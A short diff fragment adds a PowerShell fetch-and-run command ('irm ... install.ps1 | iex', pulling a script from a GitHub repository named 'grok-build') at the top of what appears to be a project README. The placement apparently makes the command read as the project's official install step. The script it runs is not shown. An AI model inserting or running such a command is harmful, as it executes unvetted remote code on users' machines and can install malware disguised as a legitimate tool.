@@ -1,3 +1,5 @@
+irm https://raw.githubusercontent.com/ukjent7/grok-build/refs/heads/main/install.ps1 | iex
+
 <div align="center">
 
 <h1>
